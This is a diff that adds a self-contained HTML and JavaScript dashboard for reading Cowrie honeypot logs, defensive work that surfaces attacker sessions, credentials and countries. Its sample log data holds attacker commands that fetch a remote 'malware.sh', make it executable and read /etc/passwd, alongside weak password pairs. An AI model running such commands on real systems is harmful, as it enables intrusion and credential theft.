@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Breach Journal — Cowrie Honeypot</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap');
+
+  :root{
+    --bg:#10141a;
+    --panel:#171d26;
+    --panel-2:#1d2530;
+    --line:#2a3341;
+    --text:#d9e0e8;
+    --muted:#7c8798;
+    --amber:#ffb454;
+    --amber-dim:#8a6a3a;
+    --green:#7fd88f;
+    --red:#e2705f;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;}
+  .wrap{max-width:980px;margin:0 auto;padding:28px 20px 80px;}
+
+  /* header */
+  .top{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:22px;border-bottom:1px solid var(--line);padding-bottom:18px;}
+  .brand{display:flex;flex-direction:column;gap:4px;}
+  .brand .eyebrow{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.14em;color:var(--amber);text-transform:uppercase;}
+  .brand h1{font-family:'Space Grotesk',sans-serif;font-size:30px;font-weight:700;margin:0;letter-spacing:-0.01em;}
+  .brand .sub{font-size:13px;color:var(--muted);}
+  .status{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);}
+  .dot.idle{background:var(--muted);box-shadow:none;}
+
+  /* input panel */
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px;margin-bottom:22px;}
+  .panel h2{font-family:'Space Grotesk',sans-serif;font-size:15px;margin:0 0 10px;font-weight:600;}
+  .panel p.hint{font-size:12.5px;color:var(--muted);margin:0 0 12px;line-height:1.5;}
+  textarea{width:100%;min-height:120px;background:#0d1116;border:1px solid var(--line);border-radius:7px;color:var(--text);font-family:'IBM Plex Mono',monospace;font-size:12px;padding:12px;resize:vertical;}
+  textarea:focus{outline:none;border-color:var(--amber-dim);}
+  .row{display:flex;gap:10px;margin-top:12px;align-items:center;flex-wrap:wrap;}
+  button{font-family:'Inter',sans-serif;font-weight:600;font-size:13px;border-radius:7px;border:1px solid var(--line);padding:9px 16px;cursor:pointer;background:var(--panel-2);color:var(--text);transition:border-color .15s;}
+  button:hover{border-color:var(--amber-dim);}
+  button.primary{background:var(--amber);color:#1a1305;border-color:var(--amber);}
+  button.primary:hover{filter:brightness(1.08);}
+  .err{color:var(--red);font-size:12px;font-family:'IBM Plex Mono',monospace;margin-top:8px;display:none;}
+
+  /* stats */
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:22px;}
+  .stat{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;}
+  .stat .n{font-family:'Space Grotesk',sans-serif;font-size:26px;font-weight:700;color:var(--amber);line-height:1;}
+  .stat .l{font-size:11.5px;color:var(--muted);margin-top:6px;font-family:'IBM Plex Mono',monospace;letter-spacing:.03em;}
+
+  /* breakdown panels */
+  .breakdowns{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:26px;}
+  .bd h3{font-family:'Space Grotesk',sans-serif;font-size:13px;margin:0 0 12px;color:var(--muted);font-weight:600;letter-spacing:.02em;}
+  .bar-row{display:grid;grid-template-columns:90px 1fr 34px;align-items:center;gap:10px;margin-bottom:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;}
+  .bar-row .k{color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  .bar-track{height:7px;background:#0d1116;border-radius:4px;overflow:hidden;}
+  .bar-fill{height:100%;background:linear-gradient(90deg,var(--amber-dim),var(--amber));border-radius:4px;}
+  .bar-row .v{color:var(--muted);text-align:right;}
+
+  /* journal */
+  .journal h2{font-family:'Space Grotesk',sans-serif;font-size:17px;margin:0 0 4px;}
+  .journal .jsub{font-size:12.5px;color:var(--muted);margin-bottom:14px;}
+  .filterbar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;}
+  .filterbar input{background:var(--panel);border:1px solid var(--line);border-radius:7px;color:var(--text);font-family:'IBM Plex Mono',monospace;font-size:12px;padding:7px 10px;flex:1;min-width:180px;}
+  .filterbar select{background:var(--panel);border:1px solid var(--line);border-radius:7px;color:var(--text);font-family:'Inter',sans-serif;font-size:12.5px;padding:7px 10px;}
+
+  .entry{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--amber-dim);border-radius:9px;padding:14px 16px;margin-bottom:10px;}
+  .entry.success{border-left-color:var(--green);}
+  .entry-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;cursor:pointer;}
+  .entry-ip{font-family:'IBM Plex Mono',monospace;font-weight:600;font-size:14px;color:var(--text);}
+  .entry-loc{font-size:11.5px;color:var(--muted);margin-left:8px;}
+  .entry-time{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--muted);white-space:nowrap;}
+  .entry-meta{display:flex;gap:10px;margin-top:6px;flex-wrap:wrap;}
+  .chip{font-family:'IBM Plex Mono',monospace;font-size:11px;padding:2px 8px;border-radius:5px;background:var(--panel-2);color:var(--muted);border:1px solid var(--line);}
+  .chip.protocol{color:var(--amber);border-color:var(--amber-dim);}
+  .chip.success{color:var(--green);border-color:#3a5a3f;}
+  .chip.fail{color:var(--red);border-color:#5a3a35;}
+
+  .entry-body{display:none;margin-top:12px;padding-top:12px;border-top:1px dashed var(--line);}
+  .entry.open .entry-body{display:block;}
+  .term{background:#0a0d11;border-radius:7px;padding:10px 12px;font-family:'IBM Plex Mono',monospace;font-size:12px;line-height:1.7;color:#a9c9a9;max-height:220px;overflow-y:auto;}
+  .term .cmdline::before{content:"$ ";color:var(--amber);}
+  .term .noop{color:var(--muted);font-style:italic;}
+  .cred-row{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);margin-bottom:8px;}
+  .cred-row b{color:var(--text);}
+
+  .empty{text-align:center;padding:50px 20px;color:var(--muted);font-size:13px;border:1px dashed var(--line);border-radius:10px;}
+  .empty .big{font-family:'Space Grotesk',sans-serif;font-size:16px;color:var(--text);margin-bottom:6px;}
+
+  ::-webkit-scrollbar{width:8px;height:8px;}
+  ::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="top">
+    <div class="brand">
+      <div class="eyebrow">Cowrie / AWS EC2</div>
+      <h1>Breach Journal</h1>
+      <div class="sub">Readable log of every intrusion attempt against the honeypot</div>
+    </div>
+    <div class="status" id="statusLine">
+      <span class="dot idle"></span> No data loaded
+    </div>
+  </div>
+
+  <div class="panel">
+    <h2>Paste log data</h2>
+    <p class="hint">
+      On the server, run:
+      <code style="color:var(--amber)">sudo -u cowrie cat /home/cowrie/cowrie/var/log/cowrie/cowrie.json</code>
+      &nbsp;— then paste the output below (one JSON object per line, exactly as Cowrie writes it).
+    </p>
+    <textarea id="rawInput" placeholder='{"session":"...","eventid":"cowrie.login.success", ...}'></textarea>
+    <div class="row">
+      <button class="primary" id="parseBtn">Parse log</button>
+      <button id="sampleBtn">Load sample data</button>
+      <button id="clearBtn">Clear</button>
+      <span id="geoStatus" style="font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--muted);"></span>
+    </div>
+    <div class="err" id="errMsg"></div>
+  </div>
+
+  <div id="results" style="display:none;">
+
+    <div class="stats">
+      <div class="stat"><div class="n" id="statSessions">0</div><div class="l">SESSIONS</div></div>
+      <div class="stat"><div class="n" id="statIps">0</div><div class="l">UNIQUE IPs</div></div>
+      <div class="stat"><div class="n" id="statLogins">0</div><div class="l">LOGIN ATTEMPTS</div></div>
+      <div class="stat"><div class="n" id="statCmds">0</div><div class="l">COMMANDS RUN</div></div>
+    </div>
+
+    <div class="breakdowns">
+      <div class="bd panel">
+        <h3>TOP USERNAME / PASSWORD PAIRS</h3>
+        <div id="topCreds"></div>
+      </div>
+      <div class="bd panel">
+        <h3>TOP SOURCE COUNTRIES</h3>
+        <div id="topCountries"></div>
+      </div>
+    </div>
+
+    <div class="journal">
+      <h2>Session log</h2>
+      <div class="jsub">Click an entry to expand the full transcript</div>
+      <div class="filterbar">
+        <input type="text" id="searchBox" placeholder="Search IP, username, password, or command...">
+        <select id="protoFilter">
+          <option value="all">All protocols</option>
+          <option value="ssh">SSH only</option>
+          <option value="telnet">Telnet only</option>
+        </select>
+      </div>
+      <div id="entries"></div>
+    </div>
+
+  </div>
+
+  <div class="empty" id="emptyState">
+    <div class="big">No log data yet</div>
+    Paste your <code>cowrie.json</code> output above, or click "Load sample data" to see how it looks.
+  </div>
+
+</div>
+
+<script>
+let sessions = {};
+let geoCache = {};
+
+function parseLines(raw){
+  const lines = raw.split('\n').map(l=>l.trim()).filter(l=>l.length>2);
+  const parsed = [];
+  for(const line of lines){
+    try{ parsed.push(JSON.parse(line)); }catch(e){ /* skip bad lines */ }
+  }
+  return parsed;
+}
+
+function buildSessions(events){
+  const s = {};
+  for(const ev of events){
+    const id = ev.session || 'unknown';
+    if(!s[id]) s[id] = {
+      session:id, protocol:ev.protocol||'ssh', src_ip:ev.src_ip||'?',
+      start:null, end:null, username:null, password:null,
+      loginSuccess:false, loginAttempted:false, commands:[]
+    };
+    const rec = s[id];
+    if(ev.src_ip) rec.src_ip = ev.src_ip;
+    if(ev.protocol) rec.protocol = ev.protocol;
+    if(ev.timestamp){
+      if(!rec.start || ev.timestamp < rec.start) rec.start = ev.timestamp;
+      if(!rec.end || ev.timestamp > rec.end) rec.end = ev.timestamp;
+    }
+    if(ev.eventid === 'cowrie.login.success' || ev.eventid === 'cowrie.login.failed'){
+      rec.loginAttempted = true;
+      rec.username = ev.username;
+      rec.password = ev.password;
+      rec.loginSuccess = ev.eventid === 'cowrie.login.success';
+    }
+    if(ev.eventid === 'cowrie.command.input' && ev.input){
+      rec.commands.push(ev.input);
+    }
+  }
+  return s;
+}
+
+function fmtTime(ts){
+  if(!ts) return '—';
+  const d = new Date(ts);
+  return d.toLocaleString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+}
+
+function isPrivateIp(ip){
+  return !ip || ip==='?' || ip.startsWith('127.') || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.');
+}
+
+async function geoLookup(ip){
+  if(isPrivateIp(ip)) return {country:'Local / internal'};
+  if(geoCache[ip]) return geoCache[ip];
+  try{
+    const res = await fetch('https://ipapi.co/'+ip+'/json/');
+    if(!res.ok) throw new Error('bad response');
+    const data = await res.json();
+    const result = {country: data.country_name || 'Unknown'};
+    geoCache[ip] = result;
+    return result;
+  }catch(e){
+    return {country:'Unknown'};
+  }
+}
+
+function topN(counts, n){
+  return Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,n);
+}
+
+function renderBars(container, pairs, total){
+  container.innerHTML = '';
+  if(pairs.length===0){
+    container.innerHTML = '<div style="color:var(--muted);font-size:12px;font-family:\'IBM Plex Mono\',monospace;">No data yet</div>';
+    return;
+  }
+  const max = pairs[0][1];
+  for(const [label, count] of pairs){
+    const row = document.createElement('div');
+    row.className = 'bar-row';
+    row.innerHTML = `<div class="k" title="${label}">${label}</div>
+      <div class="bar-track"><div class="bar-fill" style="width:${(count/max*100)}%"></div></div>
+      <div class="v">${count}</div>`;
+    container.appendChild(row);
+  }
+}
+
+async function renderAll(){
+  const ids = Object.keys(sessions);
+  const list = ids.map(id=>sessions[id]);
+
+  document.getElementById('statSessions').textContent = list.length;
+  document.getElementById('statIps').textContent = new Set(list.map(s=>s.src_ip)).size;
+  document.getElementById('statLogins').textContent = list.filter(s=>s.loginAttempted).length;
+  document.getElementById('statCmds').textContent = list.reduce((a,s)=>a+s.commands.length,0);
+
+  const credCounts = {};
+  for(const s of list){
+    if(s.loginAttempted){
+      const key = (s.username||'?') + ' / ' + (s.password||'?');
+      credCounts[key] = (credCounts[key]||0)+1;
+    }
+  }
+  renderBars(document.getElementById('topCreds'), topN(credCounts,6));
+
+  // geo lookups, capped to avoid rate limits
+  const uniqueIps = [...new Set(list.map(s=>s.src_ip))].filter(ip=>!isPrivateIp(ip)).slice(0,25);
+  const geoStatusEl = document.getElementById('geoStatus');
+  if(uniqueIps.length>0){
+    geoStatusEl.textContent = `Looking up ${uniqueIps.length} IP location(s)...`;
+    await Promise.all(uniqueIps.map(ip=>geoLookup(ip)));
+    geoStatusEl.textContent = '';
+  }
+
+  const countryCounts = {};
+  for(const s of list){
+    const g = isPrivateIp(s.src_ip) ? {country:'Local / internal'} : (geoCache[s.src_ip] || {country:'Unknown'});
+    countryCounts[g.country] = (countryCounts[g.country]||0)+1;
+  }
+  renderBars(document.getElementById('topCountries'), topN(countryCounts,6));
+
+  renderEntries();
+
+  document.getElementById('statusLine').innerHTML =
+    `<span class="dot"></span> ${list.length} session(s) loaded`;
+}
+
+function renderEntries(){
+  const container = document.getElementById('entries');
+  container.innerHTML = '';
+  const search = document.getElementById('searchBox').value.toLowerCase();
+  const proto = document.getElementById('protoFilter').value;
+
+  let list = Object.values(sessions).sort((a,b)=> (b.start||'').localeCompare(a.start||''));
+
+  list = list.filter(s=>{
+    if(proto!=='all' && s.protocol!==proto) return false;
+    if(!search) return true;
+    const hay = [s.src_ip, s.username, s.password, ...s.commands].join(' ').toLowerCase();
+    return hay.includes(search);
+  });
+
+  if(list.length===0){
+    container.innerHTML = '<div class="empty">No sessions match your filter.</div>';
+    return;
+  }
+
+  for(const s of list){
+    const div = document.createElement('div');
+    div.className = 'entry' + (s.loginSuccess ? ' success' : '');
+    const g = isPrivateIp(s.src_ip) ? {country:'Local / internal'} : (geoCache[s.src_ip] || {country:'Unknown'});
+
+    const cmdHtml = s.commands.length>0
+      ? s.commands.map(c=>`<div class="cmdline">${escapeHtml(c)}</div>`).join('')
+      : '<div class="noop">No commands were run this session.</div>';
+
+    div.innerHTML = `
+      <div class="entry-head">
+        <div>
+          <span class="entry-ip">${s.src_ip}</span>
+          <span class="entry-loc">${g.country}</span>
+        </div>
+        <div class="entry-time">${fmtTime(s.start)}</div>
+      </div>
+      <div class="entry-meta">
+        <span class="chip protocol">${s.protocol.toUpperCase()}</span>
+        ${s.loginAttempted ? `<span class="chip ${s.loginSuccess?'success':'fail'}">${s.loginSuccess?'LOGIN SUCCESS':'LOGIN FAILED'}</span>` : ''}
+        ${s.commands.length>0 ? `<span class="chip">${s.commands.length} command(s)</span>` : ''}
+      </div>
+      <div class="entry-body">
+        ${s.loginAttempted ? `<div class="cred-row">Tried username <b>${escapeHtml(s.username||'')}</b> with password <b>${escapeHtml(s.password||'')}</b></div>` : ''}
+        <div class="term">${cmdHtml}</div>
+      </div>
+    `;
+    div.querySelector('.entry-head').addEventListener('click', ()=> div.classList.toggle('open'));
+    container.appendChild(div);
+  }
+}
+
+function escapeHtml(str){
+  const d = document.createElement('div');
+  d.textContent = str;
+  return d.innerHTML;
+}
+
+document.getElementById('parseBtn').addEventListener('click', async ()=>{
+  const raw = document.getElementById('rawInput').value;
+  const errEl = document.getElementById('errMsg');
+  errEl.style.display = 'none';
+  const events = parseLines(raw);
+  if(events.length===0){
+    errEl.textContent = 'No valid JSON log lines found — check that you pasted the raw cowrie.json content.';
+    errEl.style.display = 'block';
+    return;
+  }
+  sessions = buildSessions(events);
+  document.getElementById('results').style.display = 'block';
+  document.getElementById('emptyState').style.display = 'none';
+  await renderAll();
+});
+
+document.getElementById('clearBtn').addEventListener('click', ()=>{
+  document.getElementById('rawInput').value = '';
+  sessions = {};
+  document.getElementById('results').style.display = 'none';
+  document.getElementById('emptyState').style.display = 'block';
+  document.getElementById('statusLine').innerHTML = '<span class="dot idle"></span> No data loaded';
+});
+
+document.getElementById('searchBox').addEventListener('input', renderEntries);
+document.getElementById('protoFilter').addEventListener('change', renderEntries);
+
+const SAMPLE = `{"session":"380748af1ce0","protocol":"ssh","src_ip":"185.220.101.45","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-08-23T14:31:44.405240Z"}
+{"session":"380748af1ce0","protocol":"ssh","src_ip":"185.220.101.45","username":"root","password":"admin123","eventid":"cowrie.login.failed","timestamp":"2026-08-23T14:31:46.367110Z"}
+{"session":"7a12bb90f231","protocol":"ssh","src_ip":"45.155.205.12","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-08-23T15:02:10.100000Z"}
+{"session":"7a12bb90f231","protocol":"ssh","src_ip":"45.155.205.12","username":"root","password":"123456","eventid":"cowrie.login.success","timestamp":"2026-08-23T15:02:12.200000Z"}
+{"session":"7a12bb90f231","protocol":"ssh","src_ip":"45.155.205.12","input":"whoami","eventid":"cowrie.command.input","timestamp":"2026-08-23T15:02:15.000000Z"}
+{"session":"7a12bb90f231","protocol":"ssh","src_ip":"45.155.205.12","input":"wget http://185.220.1.1/malware.sh","eventid":"cowrie.command.input","timestamp":"2026-08-23T15:02:20.000000Z"}
+{"session":"7a12bb90f231","protocol":"ssh","src_ip":"45.155.205.12","input":"chmod +x malware.sh","eventid":"cowrie.command.input","timestamp":"2026-08-23T15:02:22.000000Z"}
+{"session":"c3e04412ab90","protocol":"telnet","src_ip":"91.240.118.4","dst_port":2223,"eventid":"cowrie.session.connect","timestamp":"2026-08-23T16:11:00.000000Z"}
+{"session":"c3e04412ab90","protocol":"telnet","src_ip":"91.240.118.4","username":"admin","password":"admin","eventid":"cowrie.login.failed","timestamp":"2026-08-23T16:11:03.000000Z"}
+{"session":"e88df03aa112","protocol":"ssh","src_ip":"103.145.12.90","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-08-23T17:40:00.000000Z"}
+{"session":"e88df03aa112","protocol":"ssh","src_ip":"103.145.12.90","username":"admin","password":"password","eventid":"cowrie.login.success","timestamp":"2026-08-23T17:40:03.000000Z"}
+{"session":"e88df03aa112","protocol":"ssh","src_ip":"103.145.12.90","input":"uname -a","eventid":"cowrie.command.input","timestamp":"2026-08-23T17:40:06.000000Z"}
+{"session":"e88df03aa112","protocol":"ssh","src_ip":"103.145.12.90","input":"cat /etc/passwd","eventid":"cowrie.command.input","timestamp":"2026-08-23T17:40:09.000000Z"}`;
+
+document.getElementById('sampleBtn').addEventListener('click', ()=>{
+  document.getElementById('rawInput').value = SAMPLE;
+  document.getElementById('parseBtn').click();
+});
+</script>
+</body>
+</html>
